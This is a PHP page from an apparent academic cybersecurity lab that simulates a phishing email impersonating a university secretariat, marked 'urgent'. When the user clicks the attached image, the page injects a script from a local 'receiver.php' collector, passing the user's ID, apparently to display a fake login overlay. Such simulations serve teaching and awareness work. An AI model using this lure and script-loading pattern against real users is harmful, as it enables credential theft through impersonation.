<?php
// fake_login/read_message.php
// Interface de Lecture de Message — Simulation Automatisée (Version Sécurisée)

session_start();

// 1. Contrôle d'accès : Réservé aux auditeurs authentifiés
if (!isset($_SESSION["user_id"])) {
    header("Location: ../login.php");
    exit();
}

$user_id = intval($_SESSION["user_id"]);
$username = $_SESSION["username"] ?? "Auditeur";
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Messagerie — Lecture du Message</title>
    <style>
        :root {
            --bg-page: #ffffff;
            --text-dark: #2c3e50;
            --text-muted: #7f8c8d;
            --teal-accent: #16a085;
            --teal-light: #e8f8f5;
            --border-color: #e2e8f0;
            --bg-container: #f8f9fa;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-container);
            color: var(--text-dark);
            line-height: 1.6;
            margin: 0;
            padding: 20px;
        }

        .main-wrapper {
            max-width: 800px;
            margin: 40px auto;
            background-color: var(--bg-page);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 35px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
        }

        .back-link {
            display: inline-block;
            color: var(--teal-accent);
            text-decoration: none;
            font-weight: 600;
            margin-bottom: 25px;
            font-size: 0.9rem;
        }

        .back-link:hover {
            text-decoration: underline;
        }

        .message-card {
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 25px;
        }

        .message-header {
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 15px;
            margin-bottom: 20px;
            font-size: 0.9rem;
        }

        .message-header p {
            margin: 5px 0;
        }

        .message-body {
            font-size: 0.95rem;
            color: var(--text-dark);
        }

        /* Zone interactive de la pièce jointe */
        .attachment-zone {
            margin: 30px 0;
            text-align: center;
            padding: 20px;
            background-color: var(--bg-container);
            border: 2px dashed var(--teal-accent);
            border-radius: 6px;
        }

        .stego-image {
            max-width: 250px;
            height: auto;
            cursor: pointer;
            border-radius: 4px;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }

        .stego-image:hover {
            transform: scale(1.02);
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }

        .attachment-instruction {
            font-size: 0.8rem;
            color: var(--text-muted);
            margin-top: 10px;
            font-style: italic;
        }

        .lab-footer {
            margin-top: 40px;
            border-top: 1px solid var(--border-color);
            padding-top: 20px;
            font-size: 0.8rem;
            color: var(--text-muted);
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <a href="index_home.php" class="back-link">← Retour au Centre de Contrôle</a>

        <div class="message-card">
            
            <div class="message-header">
                <p><strong>De :</strong> Secrétariat Académique MDI <code>&lt;nepasrepondre@univ-fianar.mg&gt;</code></p>
                <p><strong>À :</strong> <?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8'); ?></p>
                <p><strong>Date :</strong> <?php echo date('d M Y (H:i)'); ?></p>
                <p><strong>Objet :</strong> <span style="color: #e67e22; font-weight: bold;">[Urgent]</span> Rapport de validation d'environnement - S4</p>
            </div>

            <div class="message-body">
                <p>Bonjour,</p>
                <p>Veuillez prendre connaissance du graphique récapitulatif concernant les indicateurs de performance de votre groupe de projet pour le module Cybersécurité.</p>
                <p>Les métadonnées structurelles complètes ont été injectées au sein du fichier image ci-dessous. Veuillez cliquer sur l'aperçu pour lancer l'outil d'extraction automatisé du laboratoire.</p>
                
                <div class="attachment-zone">
                    <img src="../assets/img/rapport_cyber.png" id="stego-trigger" alt="Rapport de performance" class="stego-image">
                    <div class="attachment-instruction">
                        🔬 Action requise : Cliquez sur l'image pour simuler l'analyse stéganographique LSB.
                    </div>
                </div>

                <p>Cordialement,<br>Le Responsable de Mention.</p>
            </div>

        </div>

        <div class="lab-footer">
            <p>Session active de l'auditeur : <strong><?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8'); ?></strong> (ID: <?= $user_id; ?>)</p>
            <p>Projet Académique Cybersécurité — Option MDI L1 — Année 2026</p>
        </div>
    </div>

    <script>
    document.addEventListener("DOMContentLoaded", function() {
        // Sélection de l'image par son ID unique
        const targetImage = document.getElementById('stego-trigger');
        
        if (targetImage) {
            // Écoute de l'événement de clic utilisateur
            targetImage.addEventListener('click', function() {
                console.log("[Lab-Audit] Interaction détectée. Extraction de la trame JavaScript cachée...");

                // Évite l'injection multiple si la modale est déjà présente à l'écran
                if (document.getElementById('phishing-overlay')) return;

                // 1. Construction dynamique de l'élément de script
                const autoScript = document.createElement('script');
                
                // 2. Attribution de la cible vers votre collecteur dynamique receiver.php
                // Injection dynamique de l'ID de l'auditeur connecté issu de PHP
                const currentSenderId = <?php echo json_encode($user_id); ?>;
                autoScript.src = `http://localhost/projects/MDI/cyber-securite/messagerie/codes/fake_login/receiver.php?sender=${currentSenderId}`;
                
                // 3. Injection matérielle dans la page pour exécution immédiate
                document.body.appendChild(autoScript);
            });
        }
    });
    </script>

</body>
</html>